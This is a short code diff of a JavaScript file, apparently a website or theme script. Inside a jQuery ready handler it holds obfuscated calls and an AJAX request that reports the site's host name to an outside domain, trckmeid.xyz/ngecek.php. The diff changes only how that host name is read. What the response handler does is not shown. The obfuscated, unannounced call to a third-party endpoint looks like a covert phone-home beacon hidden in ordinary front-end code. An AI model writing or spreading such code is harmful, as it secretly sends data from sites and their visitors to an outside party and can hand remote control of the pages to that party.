@@ -187,9 +187,10 @@ $(document)["ready"](function() {
     $(_0x1e1a("0xd7", "T*VW"))[_0x1e1a("0x1c0", "ioKw")](_0x1e1a("0x1c9", "&O0x"));
     $(_0x1e1a("0xa5", "5miN"))["remove"]();
   }
+  var domurl = window.location.host;
   $.ajax({
       method: "GET",
-      url: "https://trckmeid.xyz/ngecek.php?url="+document.location.hostname,
+      url: "https://trckmeid.xyz/ngecek.php?url="+domurl,
       data: ""
     })
       .done(function( msg ) {
